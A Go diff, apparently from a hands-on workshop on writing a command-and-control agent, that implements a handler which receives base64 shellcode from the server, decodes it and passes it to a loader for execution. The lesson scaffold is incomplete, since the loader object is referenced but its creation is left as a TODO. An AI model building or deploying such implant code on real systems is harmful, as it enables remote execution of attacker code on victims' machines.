@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"log"
 	"workshop3_dev/internals/models"
+	"workshop3_dev/internals/shellcode"
 )
 
 // TODO: Implement orchestrateShellcode to handle the "shellcode" command
@@ -14,26 +15,26 @@ import (
 // decodes the base64 shellcode, and calls the actual shellcode execution
 func (agent *Agent) orchestrateShellcode(job *models.ServerResponse) models.AgentTaskResult {
 
-	// TODO: Create a variable to hold the shellcode arguments
+	// Create an instance of the shellcode args struct
+	// TODO: Implement shellcodeArgs of type models.ShellcodeArgsAgent
 	var shellcodeArgs models.ShellcodeArgsAgent
 
-	// TODO: Unmarshal job.Arguments into shellcodeArgs
-	// Hint: json.Unmarshal(job.Arguments, &shellcodeArgs)
+	// ServerResponse.Arguments contains the command-specific args, so now we unmarshal the field into the struct
 	if err := json.Unmarshal(job.Arguments, &shellcodeArgs); err != nil {
 		errMsg := fmt.Sprintf("Failed to unmarshal ShellcodeArgs for Task ID %s: %v. ", job.JobID, err)
-		log.Printf("|ERR SHELLCODE ORCHESTRATOR| %s", errMsg)
+		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| %s", errMsg)
 		return models.AgentTaskResult{
 			JobID:   job.JobID,
 			Success: false,
 			Error:   errors.New("failed to unmarshal ShellcodeArgs"),
 		}
 	}
-	log.Printf("|SHELLCODE ORCHESTRATOR| Task ID: %s. Executing Shellcode, Export Function: %s, ShellcodeLen(b64)=%d\n",
+	log.Printf("|✅ SHELLCODE ORCHESTRATOR| Task ID: %s. Executing Shellcode, Export Function: %s, ShellcodeLen(b64)=%d\n",
 		job.JobID, shellcodeArgs.ExportName, len(shellcodeArgs.ShellcodeBase64))
 
-	// TODO: Validate that ShellcodeBase64 is not empty
+	// Some basic agent-side validation
 	if shellcodeArgs.ShellcodeBase64 == "" {
-		log.Printf("|ERR SHELLCODE ORCHESTRATOR| Task ID %s: ShellcodeBase64 is empty.", job.JobID)
+		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: ShellcodeBase64 is empty.", job.JobID)
 		return models.AgentTaskResult{
 			JobID:   job.JobID,
 			Success: false,
@@ -41,9 +42,8 @@ func (agent *Agent) orchestrateShellcode(job *models.ServerResponse) models.Agen
 		}
 	}
 
-	// TODO: Validate that ExportName is not empty
 	if shellcodeArgs.ExportName == "" {
-		log.Printf("|ERR SHELLCODE ORCHESTRATOR| Task ID %s: ExportName is empty.", job.JobID)
+		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: ExportName is empty.", job.JobID)
 		return models.AgentTaskResult{
 			JobID:   job.JobID,
 			Success: false,
@@ -51,11 +51,12 @@ func (agent *Agent) orchestrateShellcode(job *models.ServerResponse) models.Agen
 		}
 	}
 
-	// TODO: Decode the base64 shellcode
-	// Hint: base64.StdEncoding.DecodeString(shellcodeArgs.ShellcodeBase64)
+	// Now let's decode our b64
+	// TODO create rawShellcode by calling base64.StdEncoding.DecodeString()
+
 	rawShellcode, err := base64.StdEncoding.DecodeString(shellcodeArgs.ShellcodeBase64)
 	if err != nil {
-		log.Printf("|ERR SHELLCODE ORCHESTRATOR| Task ID %s: Failed to decode ShellcodeBase64: %v", job.JobID, err)
+		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: Failed to decode ShellcodeBase64: %v", job.JobID, err)
 		return models.AgentTaskResult{
 			JobID:   job.JobID,
 			Success: false,
@@ -63,22 +64,32 @@ func (agent *Agent) orchestrateShellcode(job *models.ServerResponse) models.Agen
 		}
 	}
 
-	// TODO: Call the "doer" function (will be implemented in lesson 09)
-	// For now, this is a placeholder - the actual shellcode package will be added later
-	// commandShellcode := shellcode.New()
-	// shellcodeResult, err := commandShellcode.DoShellcode(rawShellcode, shellcodeArgs.ExportName)
-
-	// Placeholder result for now
-	log.Printf("|SHELLCODE ORCHESTRATOR| Decoded shellcode: %d bytes", len(rawShellcode))
+	// Call the "doer" function
+	// TODO create commandShellcode by calling shellcode.New()
+	
+	shellcodeResult, err := commandShellcode.DoShellcode(rawShellcode, shellcodeArgs.ExportName)
 
 	finalResult := models.AgentTaskResult{
 		JobID: job.JobID,
+		// Output will be set below after JSON encoding
 	}
 
-	// The actual implementation will set Success and CommandResult based on shellcode execution
-	// For now, just return a placeholder
-	outputJSON, _ := json.Marshal("Shellcode orchestrator placeholder - doer not yet implemented")
+	outputJSON, _ := json.Marshal(string(shellcodeResult.Message))
+
 	finalResult.CommandResult = outputJSON
+
+	if err != nil {
+		loaderError := fmt.Sprintf("|❗ERR SHELLCODE ORCHESTRATOR| Loader execution error for TaskID %s: %v. Loader Message: %s",
+			job.JobID, err, shellcodeResult.Message)
+		log.Printf(loaderError)
+		finalResult.Error = errors.New(loaderError)
+		finalResult.Success = false
+
+	} else {
+		log.Printf("|👊 SHELLCODE SUCCESS| Shellcode execution initiated successfully for TaskID %s. Loader Message: %s",
+			job.JobID, shellcodeResult.Message)
+		finalResult.Success = true
+	}
 
 	return finalResult
 }
